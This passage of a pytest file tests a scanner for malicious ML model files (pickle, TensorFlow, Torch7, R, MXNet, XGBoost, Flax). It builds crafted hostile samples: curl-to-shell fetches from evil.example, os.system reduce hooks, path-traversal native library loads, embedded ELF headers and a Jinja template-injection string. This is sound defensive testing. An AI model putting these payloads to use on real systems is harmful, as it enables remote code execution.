        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert bool(security_findings) is malicious
    has_pickle_finding = any(
        issue.rule_code == "S201" and issue.details.get("zip_entry") == "payload.pkl" for issue in result.issues
    )
    assert has_pickle_finding is malicious


def test_scan_nested_file_reports_unavailable_keras_scanner_when_zip_fallback_is_excluded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    nested_keras = tmp_path / "nested.keras"
    with zipfile.ZipFile(nested_keras, "w") as archive:
        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
    original_load_scanner = _registry._load_scanner

    def load_scanner(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(_registry, "_load_scanner", load_scanner)

    result = scan_nested_file(
        str(nested_keras),
        {"scanners": ["keras_zip"], "cache_enabled": False},
    )

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert not any(check.name == "Scanner Selection" for check in result.checks)


def test_scan_nested_file_unavailable_keras_scanner_restores_whitelist_downgrade(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    nested_keras = tmp_path / "nested.keras"
    with zipfile.ZipFile(nested_keras, "w") as archive:
        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
    original_load_scanner = _registry._load_scanner

    def load_scanner(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    def scan_with_whitelisted_finding(self: ZipScanner, path: str) -> ScanResult:
        self.context = UnifiedMLContext(
            file_path=Path(path),
            file_size=Path(path).stat().st_size,
            file_type=".keras",
            model_id=next(iter(POPULAR_MODELS)),
            model_source="huggingface",
        )
        result = self._create_result()
        result.add_check(
            name="Fallback Security Finding",
            passed=False,
            message="High confidence fallback anomaly",
            severity=IssueSeverity.CRITICAL,
            rule_code="CUSTOM001",
        )
        result.finish(success=True)
        assert result.issues[0].severity == IssueSeverity.INFO
        return result

    monkeypatch.setattr(_registry, "_load_scanner", load_scanner)
    monkeypatch.setattr(ZipScanner, "scan", scan_with_whitelisted_finding)

    result = scan_nested_file(str(nested_keras), {"cache_enabled": False})

    assert result.success is False
    assert result.issues[0].severity == IssueSeverity.CRITICAL
    assert result.issues[0].details["whitelist_downgrade_restored"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"


def test_scan_nested_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload.txt"
    extracted_member.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "xml_model_routing_incomplete"
    check = next(check for check in result.checks if check.name == "XML Model Routing")
    assert "bounded probe ended before the first structural root element" in check.message


def test_scan_nested_file_fails_closed_when_tensorflow_protobuf_routing_budget_is_exhausted(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
    extracted_member = tmp_path / "ambiguous-routing.jpg"
    extracted_member.write_bytes(b"\x08\x01" + (b"\x18\x00" * 4))

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
    check = next(check for check in result.checks if check.name == "TensorFlow Protobuf Routing")
    assert "bounded structural probe reached its limit" in check.message


def test_scan_nested_file_fails_closed_when_protocolless_pickle_routing_budget_is_exhausted(
    tmp_path: Path,
) -> None:
    extracted_member = tmp_path / "ambiguous-routing.py"
    extracted_member.write_bytes(b"\x8c\x01x0" * (file_detection.PROTO0_1_MAX_PROBE_OPCODES + 1))

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["operational_error_reason"] == "pickle_routing_incomplete"
    check = next(check for check in result.checks if check.name == "Pickle Routing")
    assert check.details["format"] == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT
    assert "bounded structural probe reached its limit" in check.message


def test_scan_nested_file_fails_closed_when_unknown_prefix_hides_tensorflow_after_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
    extracted_member = tmp_path / "budget-prefixed.jpg"
    extracted_member.write_bytes(
        b"{" + (b"\x18\x00" * 3) + b"|" + b"z\x09\x81\xa6params\x80" + _build_malicious_tf_metagraph()
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"


def test_scan_nested_file_fails_closed_for_ambiguous_savedmodel_flax_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
    extracted_member = tmp_path / "saved-flax-overlap.jpg"
    extracted_member.write_bytes(
        b"{" + (b"\x18\x00" * 3) + b"|" + b"z\x09\x81\xa6params\x80" + _build_malicious_tf_savedmodel()
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"


@pytest.mark.parametrize(
    ("filename", "payload", "expected_scanner"),
    [
        ("prefixed-graph.jpg", _build_malicious_tf_metagraph, "tf_metagraph"),
        ("prefixed-saved.jpg", _build_malicious_tf_savedmodel, "tf_savedmodel"),
    ],
)
def test_scan_nested_file_routes_tensorflow_after_printable_unknown_prefix(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    payload: Callable[[], bytes],
    expected_scanner: str,
) -> None:
    monkeypatch.setattr(file_detection, "JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES", 64)
    extracted_member = tmp_path / filename
    printable_field = b"z " + (b"x" * 32)
    extracted_member.write_bytes((printable_field * 3) + payload())

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == expected_scanner
    assert result.success is False
    assert any("PyFunc" in issue.message for issue in result.issues)


def test_scan_nested_file_routes_renamed_flax_msgpack_by_structure(tmp_path: Path) -> None:
    msgpack = pytest.importorskip("msgpack")
    extracted_member = tmp_path / "payload.jpg"
    extracted_member.write_bytes(
        msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_nested_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload.bin"
    extracted_member.write_bytes(
        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["torch7"]
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_nested_file_merges_r_serialized_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload.bin"
    elf_header = bytearray(b"\x00" * 64)
    elf_header[:4] = b"\x7fELF"
    elf_header[4:7] = b"\x02\x01\x01"
    elf_header[16:18] = (2).to_bytes(2, "little")
    elf_header[18:20] = (62).to_bytes(2, "little")
    elf_header[20:24] = (1).to_bytes(4, "little")
    extracted_member.write_bytes(
        b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
        b"base::system('curl https://evil.example/payload.sh | sh')\n" + bytes(elf_header) + b"\x00" * 64
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["r_serialized"]
    assert any("Linux executable" in issue.message for issue in result.issues)
    assert any(
        check.name == "Executable Symbol Context Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert any(
        check.name == "Serialized Expression Payload Detection"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_nested_file_routes_torch7_bin_when_raw_scanner_is_suppressed(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload.bin"
    extracted_member.write_bytes(
        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["torch7"], "cache_enabled": False})

    assert result.scanner_name == "torch7"
    assert "pytorch_binary" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_nested_file_routes_renamed_mxnet_symbol_by_structure(tmp_path: Path) -> None:
    extracted_member = create_mock_mxnet_symbol(tmp_path / "payload.dat", custom_library="../../tmp/libevil.so")

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_nested_file_fails_closed_for_renamed_mxnet_shadowed_nodes(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload.dat"
    extracted_member.write_text(
        '{"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[{"op":"null","name":"data"}]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_duplicate_root_keys" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "MXNet Symbol JSON Analysis" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_nested_file_canonical_mxnet_symbol_bypasses_routing_value_budget(tmp_path: Path) -> None:
    extracted_member = tmp_path / "large-symbol.json"
    extracted_member.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


@pytest.mark.parametrize("filename", ["payload.params", "payload.meta"])
def test_scan_nested_file_runs_xgboost_checks_for_renamed_mxnet_json_overlap(tmp_path: Path, filename: str) -> None:
    extracted_member = tmp_path / filename
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_nested_file_runs_xgboost_checks_for_probable_malformed_mxnet_json_overlap(tmp_path: Path) -> None:
    extracted_member = tmp_path / "malformed-polyglot.json"
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


@pytest.mark.parametrize("filename", ["malformed-0000.params", "malformed.jpg"])
def test_scan_nested_file_runs_xgboost_checks_for_renamed_probable_malformed_mxnet_overlap(
    tmp_path: Path,
    filename: str,
) -> None:
    extracted_member = tmp_path / filename
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"__reduce__"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert any(
        "Suspicious pattern detected: Pickle-like reduction pattern in JSON" in issue.message for issue in result.issues
    )


def test_scan_nested_file_syntactically_malformed_renamed_mxnet_xgboost_overlap_fails_closed(tmp_path: Path) -> None:
    extracted_member = tmp_path / "malformed.jpg"
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],@}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]


@pytest.mark.parametrize("suffix", ["@}", ""])
def test_scan_nested_file_partial_malformed_renamed_mxnet_xgboost_overlap_fails_closed(
    tmp_path: Path,
    suffix: str,
) -> None:
    extracted_member = tmp_path / "malformed.jpg"
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":' + suffix,
        encoding="utf-8",
    )
    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]


def test_scan_nested_file_xgboost_only_runs_renamed_probable_malformed_mxnet_overlap(tmp_path: Path) -> None:
    extracted_member = tmp_path / "malformed-0000.params"
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_nested_file_xgboost_only_malformed_overlap_fails_closed(tmp_path: Path) -> None:
    extracted_member = tmp_path / "malformed-0000.params"
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_json_structure_invalid" in result.metadata["scan_outcome_reasons"]
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_nested_file_runs_xgboost_checks_for_bounded_probable_malformed_mxnet_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "bounded-polyglot.json"
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"padding":"' + ("x" * 256) + '","nodes":[{"op":"null","name":"data"}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_nested_file_keeps_benign_mxnet_json_near_match_out_of_xgboost_routing(tmp_path: Path) -> None:
    extracted_member = tmp_path / "benign-symbol.json"
    extracted_member.write_text(
        '{"learner":{"description":"benign metadata"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert not any(check.name == "JSON Content Analysis" for check in result.checks)


@pytest.mark.parametrize("filename", ["nested-metadata.json", "nested-metadata-symbol.json"])
def test_scan_nested_file_keeps_nested_xgboost_marker_names_in_mxnet_metadata_out_of_xgboost_analysis(
    tmp_path: Path,
    filename: str,
) -> None:
    extracted_member = tmp_path / filename
    extracted_member.write_text(
        '{"nodes":[{"op":"null","name":"data","attrs":{"documentation":'
        '{"version":"malformed","learner":{"gradient_booster":{},"note":"eval(x)"}}}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert not any(check.name == "JSON Content Analysis" for check in result.checks)


def test_scan_nested_file_canonical_mxnet_symbol_composes_probable_xgboost_security_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "malformed-symbol.json"
    extracted_member.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_nested_file_bom_prefixed_params_runs_xgboost_mxnet_overlap_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot-0000.params"
    extracted_member.write_text(
        '\ufeff{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_nested_file_xgboost_owned_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot-0000.params"
    extracted_member.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF"}'
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_nested_file_xgboost_owned_shadowed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot-0000.params"
    extracted_member.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","nodes":[]}'
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_nested_file_xgboost_owned_analysis_failed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot-0000.params"
    extracted_member.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_nested_file_xgboost_only_skips_overlap_params_signature_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot-0000.params"
    extracted_member.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF"}'
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is True
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_nested_file_xgboost_only_skips_shadowed_params_signature_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot-0000.params"
    extracted_member.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","nodes":[]}'
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_nested_file_xgboost_only_skips_analysis_failed_params_signature_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot-0000.params"
    extracted_member.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_nested_file_fails_closed_for_xgboost_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "XGBoost / MXNet JSON Routing" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_nested_file_mxnet_only_selection_preserves_overlap_security_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["mxnet"], "cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    xgboost_selection_checks = [
        check
        for check in result.checks
        if check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "xgboost"
    ]
    assert len(xgboost_selection_checks) == 1
    assert xgboost_selection_checks[0].details.get("kind") == "preferred"


def test_scan_nested_file_mxnet_only_selection_fails_closed_for_bounded_xgboost_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "polyglot.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},"nodes":[{"op":"Custom","name":"load",'
        '"attrs":{"library":"../../tmp/libevil.so","padding":"' + ("x" * 256) + '"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["mxnet"], "cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "xgboost"
        and check.details.get("context") == "overlapping JSON analysis"
        and check.details.get("kind") == "preferred"
        for check in result.checks
    )


def test_scan_nested_file_xgboost_only_selection_skips_overlap_mxnet_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "polyglot.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is True
    assert not any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]
    assert "xgboost_mxnet_symbol_overlap" not in result.metadata.get("scan_outcome_reasons", [])
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "mxnet"
        and check.details.get("kind") == "embedded"
        for check in result.checks
    )


def test_scan_nested_file_does_not_cap_canonical_json_overlap_to_renamed_probe_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    extracted_member = tmp_path / "polyglot.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()",'
        '"padding":"'
        + ("x" * 600)
        + '"},"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_nested_file_routes_xgboost_json_with_markers_after_mxnet_probe_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "delayed-booster.json"
    extracted_member.write_text(
        '{"padding":"' + ("x" * 256) + '","version":[1,7,4],'
        '"learner":{"gradient_booster":{},"malicious_code":"os.system()"}}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_nested_file_polyglot_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert any(
